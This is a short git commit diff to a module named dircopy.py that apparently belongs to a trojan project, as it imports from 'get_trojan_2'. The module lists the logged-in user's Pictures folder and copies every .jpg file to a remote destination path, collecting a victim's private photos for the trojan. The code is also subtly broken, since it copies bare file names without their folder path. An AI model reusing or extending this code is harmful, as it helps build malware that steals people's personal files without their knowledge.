442758ca8e773f347d5f74f01529a3b94d77e26a
craigcullen <craig340@gmail.com>
2016-03-29 16:10:50 -0600

    changed file

--- modules/dircopy.py
+++ modules/dircopy.py
@@ -8,11 +8,13 @@ Created on Mon Mar 28 20:49:04 2016
 import shutil
 import os
 
+from get_trojan_2 import store_module_result
+
 def run(**args):
     print "[*] In dircopy module"
     name = str(os.getlogin())
     source = os.listdir("/home/" + name + "/Pictures")
-    destination = remote_path
+    destination = store_module_result.remote_path
     for files in source:
         if files.endswith(".jpg"):
             shutil.copy(files, destination)
